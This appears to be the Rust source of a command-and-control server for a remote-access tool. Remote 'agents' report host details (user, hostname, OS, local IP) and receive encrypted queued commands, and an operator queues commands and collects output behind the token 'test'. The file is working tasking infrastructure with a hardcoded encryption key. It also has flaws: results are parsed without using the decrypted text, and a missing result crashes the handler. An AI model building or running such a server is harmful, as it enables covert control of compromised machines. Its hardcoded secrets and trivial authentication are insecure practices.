use std::ops::Add;
use std::{fs::File, io::BufReader};
use actix_cors::Cors;
use rand::{TryRngCore, rngs::OsRng};
use rand::Rng;

use actix_web::{App, HttpResponse, HttpServer, Responder, web};
use rustls_pemfile::{certs, pkcs8_private_keys};
use serde::{Deserialize, Serialize};
use serde_json::to_string;
use tokio_rustls::rustls::{Certificate, PrivateKey, ServerConfig};
mod cert_mng;
use actix_files::NamedFile;
use actix_web::{get,post};
use std::sync::Mutex;
use once_cell::sync::Lazy;
mod crypt;
const ENCRYPTKEY: &str = "JoomwAjm33jYi3zQTMAxtoRm6VF2Y0YL";
const CERTPATH: &str  = "/home/zirex/projects/uinor/server/src/crt/server.crt";
const SERVERKEY: &str = "/home/zirex/projects/uinor/server/src/crt/server.key";
const AUTHTOKEN: &str = "test";

pub static DEVICE_LIST: Lazy<std::sync::Mutex<Vec<Device>>> = Lazy::new(|| std::sync::Mutex::new(Vec::new()));
pub static ONLINE: Lazy<std::sync::Mutex<Vec<(u32,String)>>> = Lazy::new(|| std::sync::Mutex::new(Vec::new()));
pub static COMMANDS: Lazy<std::sync::Mutex<Vec<(String,String,String)>>> = Lazy::new(|| std::sync::Mutex::new(Vec::new()));
pub static COMMANDS_RESP: Lazy<std::sync::Mutex<Vec<(String,String,String)>>> = Lazy::new(|| std::sync::Mutex::new(Vec::new()));


fn generate_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    OsRng.try_fill_bytes(&mut key)
        .expect("OS RNG failure");
    key
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GetTaskResu {
    pub(crate)  auth: String,
    pub(crate)  id: String,
    pub(crate)  taskid: String,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AddTaskresult {
    pub(crate)  id: String,
    pub(crate)  taskid: String,
    pub(crate)  result: String,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Task {
    pub(crate)  auth: String,
    pub(crate)  id: String,
    pub(crate)  taskid: String,
    pub(crate)  command: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Search{
    pub(crate) auth: String,
    pub(crate) start: i32,
    pub(crate) end: i32,
    pub(crate) filter: String,
    pub(crate) json: bool,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Verify {
    pub(crate)  auth: String,
}
#[get("/")]
async fn mainpage() -> impl Responder{
    NamedFile::open("static/index.html")
}
#[get("/get_key")]
async fn get_key() -> String{

    return ENCRYPTKEY.to_string();
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Device {
    pub(crate) id: String,
    pub(crate) status: String,
    pub(crate) username: String,
    pub(crate) hostname: String,
    pub(crate) latency: String,
    pub(crate) os: String,
    pub(crate) os_version: String,
    pub(crate) kernal_version:String,
    pub(crate) uptime:String,
    pub(crate) local_ip: String,
}
pub fn gettask(target: String) -> Option<(String,String)> {
    
    let mut list = COMMANDS.lock().unwrap();

    if let Some(index) = list.iter().position(|(tar, _,_)| *tar == target) {
        let (_, command,taskid) = list.remove(index);
        return Some((command,taskid));
    }
    None
}
pub fn getresulttask(target: String,taskid:String) -> Option<(String,String)> {
    
    let mut list = COMMANDS_RESP.lock().unwrap();

    if let Some(index) = list.iter().position(|(tar, _,task_id)| *tar == target && taskid == *task_id) {
        let (_,resp ,task_id) = list.remove(index);
        return Some((resp,task_id));
    }
    None
}
pub fn addresponse(target: String,resp:String,taskid:String){
    let mut list = COMMANDS_RESP.lock().unwrap();
    list.push((target,resp,taskid));
}
pub fn addtask(target: String,command:String,taskid:String){
    let mut list = COMMANDS.lock().unwrap();
    list.push((target,command,taskid));
}
pub fn add_device(device: Device,cls:bool) {
    let mut list = DEVICE_LIST.lock().unwrap();
    
    let mut device = device;
    if cls == true{
        device.status = "online".to_string();
    }

    if let Some(pos) = list.iter().position(|x| x.id == device.id) {
        
        list.remove(pos);
        list.push(device);

    } else {
        list.push(device);
    }
}
pub fn setstatus(id: String,status:String){
    
    let mut list = DEVICE_LIST.lock().unwrap();

    let device_to_add = if let Some(pos) = list.iter().position(|x| x.id == id) {
        if let Some(device) = list.get_mut(pos) {
            device.status = status;
            Some(device.clone())
        } else {
            None
        }
    } else {
        None
    };
    drop(list);
    if let Some(device) = device_to_add {
        add_device(device,false);
    }

} 
pub fn set_online_list(target: &str) {

    let mut list = ONLINE.lock().unwrap();
    

    if let Some((count, name)) = list.iter_mut().find(|(_, name)| *name == target.to_string()) {
        *count = 0;
    } else {
        list.push((0,target.to_string()));
    }

    for (count, name) in list.iter_mut() {
        if name == target {
            *count = 0;
        }
    }
}
#[post("/get_result")]
async fn get_result(req:web::Json<GetTaskResu>) -> impl Responder {
    if req.auth != AUTHTOKEN{
        
         return HttpResponse::NotFound().body("invalid");
    }
    else {
        let mut result_vec: Vec<String> = Vec::new();
        let result  = getresulttask(req.id.to_string(), req.taskid.to_string() );
        match result {
            Some(result) => {
                result_vec.push(result.0);
                result_vec.push(result.1);
            },
             None => todo!(),
        }
        return HttpResponse::Ok().json(result_vec);
    };
}
#[post("/add_result")]
async fn add_result(data:String) -> impl Responder {
    let clear = crypt::decrypt_string(ENCRYPTKEY.as_bytes(), &data);
    if clear == "base64_decode_error" || clear == "invalid_data"  || clear == "decryption_error"{
        return "invalid".to_string();
    }
    else {
        let task: AddTaskresult = match serde_json::from_str(&data){
            Ok(task) => task,
            Err(_) => {
                return "invalid".to_string();
            },
        };
        addresponse(task.id.to_string(), task.result.to_string(), task.taskid.to_string());
        return "ok".to_string();
    }
   
}
#[post("/add_command")]
async fn add_command(req:web::Json<Task>) -> impl Responder {
    if req.auth != AUTHTOKEN{
        return "invalid".to_string();
    }
    else {
        addtask(req.id.to_string(), req.command.to_string(),req.taskid.to_string());
        return "ok".to_string();
    }
   
}
#[post("/verify")]
async fn verify(req:web::Json<Verify>) -> impl Responder{
    if req.auth != AUTHTOKEN{
        return "invalid".to_string();
    }
    else {
        return "ok".to_string();   
    }
}
#[post("/search")]
async fn get_device(search: web::Json<Search>) -> impl Responder {
  
    if search.auth != AUTHTOKEN {
        return HttpResponse::NotFound().body("");
    }

    let devices = DEVICE_LIST.lock().unwrap();  
    let mut filtered: Vec<Device> = devices.clone(); 
    println!("{}", search.filter);
    if !search.filter.is_empty() {
        let re = regex::Regex::new(r#"(\w+):"([^"]*)""#).unwrap();

        let mut queries = Vec::new();
        for cap in re.captures_iter(&search.filter) {
            queries.push((cap[1].to_string(), cap[2].to_string()));
        }

        filtered = filtered
            .into_iter()
            .filter(|d| {
                queries.iter().all(|(key, value)| {
                    let value = value.trim().to_lowercase(); 

                  
                    println!("Filter key: {}, value: {}", key, value);
                    println!("Device status: {}", d.status); 

                    match key.as_str() {
                        "id" => d.id == value,
                        "status" => d.status.trim().to_lowercase() == value,  
                        "username" => d.username.trim().to_lowercase() == value,
                        "hostname" => d.hostname.trim().to_lowercase() == value,
                        "os" => d.os.trim().to_lowercase() == value,
                        "os_version" => d.os_version.trim().to_lowercase() == value,
                        "kernel_version" => d.kernal_version.trim().to_lowercase() == value,
                        "uptime" => d.uptime.trim().to_lowercase() == value,
                        "local_ip" => d.local_ip.trim().to_lowercase() == value,
                        "latency" => {
                            let re = regex::Regex::new(r#"([><=]?)(\d+\.?\d*)"#).unwrap();
                            if let Some(cap) = re.captures(&value) {
                                let op = cap.get(1).map_or("", |m| m.as_str());
                                if let Ok(device_latency) = d.latency.trim().parse::<f64>() {
                                    if let Ok(filter_val) = cap[2].parse::<f64>() {
                                        match op {
                                            ">" => device_latency > filter_val,
                                            "<" => device_latency < filter_val,
                                            "=" | "" => device_latency == filter_val,
                                            _ => false,
                                        }
                                    } else {
                                        false
                                    }
                                } else {
                                    false
                                }
                            } else {
                                false
                            }
                        },
                        _ => false, 
                    }
                })
            })
            .collect();
    }

    let start = search.start.max(0) as usize;
    let end = search.end.min(filtered.len() as i32) as usize;
    let sliced = filtered[start..end].to_vec();
    if search.json {
        HttpResponse::Ok().json(sliced)
    } else {
        let summary = sliced
            .into_iter()
            .map(|d| format!("{} ({})", d.hostname, d.local_ip))
            .collect::<Vec<_>>()
            .join("\n");
        HttpResponse::Ok().body(summary)
    }
}
#[post("/advertise")]
async fn advertise_device(data:String) -> String{
    let data = data.replace('"', "");
    let data = crypt::decrypt_string(ENCRYPTKEY.as_bytes(), &data);
    let deviceobj: Device = match serde_json::from_str(&data){
        Ok(device) => device,
        Err(_) => {
            return "Ok".to_string();
        },
    };
    let device_id = deviceobj.id.to_string();
    
    add_device(deviceobj, true);
    set_online_list(&device_id);
    let task =  gettask(device_id);
    match task {
        Some(task) => {
            let command = task.0;
            let taskid: String = task.1;
            let combined: String =  command  + "__" + &taskid;
            let encryptet = crypt::encrypt_string(ENCRYPTKEY.as_bytes(),&combined);
            return encryptet.to_string();
        },
        None => return "Ok".to_string(),
    }

}
pub async fn incloop(){
    loop {
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        let mut vec = ONLINE.lock().unwrap();
        let mut to_remove: Vec<String> = Vec::new();
        for (count, name) in vec.iter_mut() {
            if *count == 3 {
                to_remove.push(name.clone());
                setstatus(name.to_string(),"offline".to_string());
            } else {
               
                *count += 1;
                
            }
        }
        vec.retain(|(_, name)| !to_remove.contains(name));
    }
}

#[actix_web::main]
async fn main() {
    let cert_path = CERTPATH;
    let key_path = SERVERKEY;
    println!("server startet waiting for incoming agents");
    let config = cert_mng::load_certs(cert_path, key_path)
        .expect("Failed to load SSL certificates");
        let https_server = HttpServer::new(|| {
        App::new()
            .wrap(Cors::default().allow_any_origin())
            .service(mainpage)
            .service(verify)
            .service(add_command)
            .service(get_device)
            .service(advertise_device)
            .service(add_result)
            .service(get_result)
            .default_service( 
            web::route().to(|| async {
                return "Not Found".to_string();
            }),
            )
    })
    .bind_rustls("0.0.0.0:6060", config).expect("This Program Couldnt be bind on 6060")
    .run();
    let _ = https_server.await;
}
